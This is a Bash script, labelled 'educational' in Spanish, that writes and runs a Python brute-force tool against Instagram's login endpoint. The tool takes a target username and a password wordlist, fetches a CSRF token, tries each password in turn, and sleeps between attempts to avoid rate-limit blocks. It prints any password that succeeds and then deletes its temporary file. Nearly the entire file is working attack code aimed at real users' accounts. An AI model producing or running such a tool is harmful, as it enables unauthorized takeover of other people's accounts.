#!/bin/bash

echo "======================================="
echo "    Fuerza Bruta Instagram (EDUCATIVO) "
echo "======================================="
read -p "Usuario de Instagram: " usuario
read -p "Ruta al diccionario de contraseñas: " diccionario

if [ ! -f "$diccionario" ]; then
  echo "El archivo de diccionario no existe."
  exit 1
fi

cat > /tmp/insta_brute.py <<EOF
import requests, sys, time

usuario = "$usuario"
diccionario = "$diccionario"

with open(diccionario, 'r') as f:
    claves = [x.strip() for x in f.readlines() if x.strip()]

login_url = "https://www.instagram.com/accounts/login/ajax/"
session = requests.Session()
session.headers.update({
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64)",
    "Referer": "https://www.instagram.com/accounts/login/"
})

session.get("https://www.instagram.com/accounts/login/")
csrf = session.cookies.get_dict().get('csrftoken', '')

for clave in claves:
    session.headers.update({"X-CSRFToken": csrf})
    data = {'username': usuario, 'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:0:{clave}'}
    r = session.post(login_url, data=data, allow_redirects=True)
    if r.status_code == 200:
        res = r.json()
        if res.get('authenticated'):
            print(f"¡Encontrada! Usuario: {usuario} Contraseña: {clave}")
            sys.exit(0)
        elif res.get('message') == 'checkpoint_required':
            print("Checkpoint de seguridad activado.")
            sys.exit(0)
        else:
            print(f"Probado: {clave} (falló)")
    else:
        print(f"Error {r.status_code}. Esperando para evitar bloqueo temporal...")
        time.sleep(10)
    time.sleep(3)
print("No se encontró ninguna contraseña válida.")
EOF

python3 /tmp/insta_brute.py
rm -f /tmp/insta_brute.py